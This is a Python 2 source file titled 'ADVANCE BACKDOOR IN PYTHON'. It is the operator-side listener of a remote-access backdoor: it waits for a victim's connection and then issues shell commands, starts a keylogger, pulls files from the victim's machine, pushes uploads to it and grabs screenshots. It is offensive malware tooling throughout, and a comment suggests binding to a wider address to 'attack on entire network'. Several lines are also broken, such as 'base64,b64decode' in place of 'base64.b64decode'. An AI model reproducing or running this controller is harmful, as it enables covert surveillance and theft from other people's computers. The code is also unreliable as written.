							## ============== ADVANCE BACKDOOR IN PYTHON ================= ##
							    ## ============== WITH MANY PROPERTISE ============= ##
								   
										#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

		                                        ### ## #       ### ##
		                                        ###      #     ###    ##
		                                        ###      #     ###      ## 
		                                        ###      #     ###       ##
		                                        ### ## #       ###        ##    
		                                        ### ## #       ###        ##
		                                        ###      #     ###        ##
		                                        ###       #    ###       ##
		                                        ###       #    ###    ##
		                                        ### # # #      ### ##
		                                                    
		                                #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

import socket
import json   # This library is taken ,because through this you can send and get as many as bytes of data as you want from the client.  
import base64

count=1

def reliable_send(data):
	json_data=json.dumps(data) # dumps is used to ( encoding to JSON objects ) 
	target.send(json_data)
       

def reliable_recv():
	json_data=""
	while True:
         	
		try:
			json_data=json_data + target.recv(1024)
			return json.loads(json_data)  # .loads() is used for ( Decoding the JSON string )
			
		except ValueError:
			continue    # Here continue means that when bytes will exceed its limit of 1024 then the loop will run again.

def Shell():
	global count
	while True:
        
		command=raw_input("* Shell~%b " %str(ip) )
		reliable_send(command)
		if command=="q":
			break

   		elif command[:2]=="cd" and len(command) > 1:
   			continue

   		elif command[:12]=="keylog_start":
   			continue

   		elif command[:8] =="download" :
   			with open(command[9:] , "wb" ) as file:
   				result=reliable_recv()
   				file.write(base64,b64decode(result))
   		elif command[:6]=="upload":
   			try:
	   			with open(command[7:],"rb") as fin:
	   				reliable_send(base64,b64encode(fin.read()))
	   		except:
	   			failed="Failed to Upload file!"
	   			reliable_send(base64,b64encode(failed))	

	   	elif command[:10]=="screenshot":
   		
   			with open("screenshot%d" % count, "wb") as screen:
   				image=reliable_recv()
   				image_decoded=base64,b64decode(image)
   				if image_decoded[:4]=="[!!]":
   					print(image_decoded)
   				else:
   					screen.write(image_decoded)
   					count+=1
		
		else:
			result=reliable_recv()
			print(result)

def Server():

	global s
	global ip
	global target        

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) ## INET means family of IPv4 Address , and Sock_Stream mean connection with client with TCP protocol
	s.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR, 1) # SOL_SOCKET is the socket layer itself. It is used for options that are protocol independent
		                                                 # SO_REUSEADDR allows your server to bind to an address which is in a. TIME_WAIT state.
	
	s.bind(("127.0.0.1",54321)) # You can change this address if you want to attacl on entire network. And 54321 is a random port.
	s.listen(5) # mean it will only accept connections till "5" and will reject "6th" connection.
	print("Listening for Incoming Connections!!!")
	target ,ip=s.accept() # target is a targets sock which will be store in the memory. and IP is of target IP Address.
	print("Target Connected!!!")


Server()
Shell()
s.close()
